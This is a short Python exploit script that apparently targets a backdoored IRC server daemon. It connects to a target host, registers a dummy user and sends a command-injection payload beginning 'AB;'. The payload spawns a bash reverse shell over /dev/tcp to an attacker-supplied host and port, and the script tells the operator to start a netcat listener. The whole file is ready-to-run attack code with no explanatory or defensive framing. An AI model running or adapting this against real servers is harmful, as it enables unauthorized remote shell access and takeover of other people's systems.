#!/usr/bin/env python3                                                                                                                                                                                       
import socket                                                                                                                
import sys                                                                                                                            
from time import sleep                                                                                                                                 

if len(sys.argv) == 5:                         
    pass                                       
else:                                          
    print(f'[*] usage: ./irc.py [target_ip] [target_port] [local_host] [local_port]\n')
    sys.exit(1)                                

ip = sys.argv[1]                               
lhost = sys.argv[3]                            
lport = sys.argv[4]                            
port = int(sys.argv[2])
rev_shell = f"AB; bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' \n"
rev_shell = rev_shell.encode()

class exploit:                                 
    def  __init__(self, sock=None):
        if sock is None:
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self):                         
        self.s.connect((ip, int(port)))
        try:                                   
            print(f'[*] Successfully connected to {ip}:{port}')
            sleep(1)                           
            print('[*] Trying to register a user ... pls wait')
            sleep(9)                           
            self.s.send(b'PASS anything')
            self.s.send(b'NICK anything')
            self.s.send(b'USER rcee 0 * rcee')
            print(f'[*] Sending backdoor... pls wait')
            sleep(1)                           
            print(f'[*] Pls setup a nc listener on: {lport}')
            sleep(9)                           
            self.s.send(rev_shell)
            print('[*] Should now have a shell')
            self.s.close()
            print('[*] Closing ...\n')
        except:                                
            print('[*] Error, pls check host, port or rev shell is correct!')
            sys.exit(1)

    def main(self):                            
        self.connect()

if __name__ == '__main__':
    exploit = exploit()
    exploit.main()
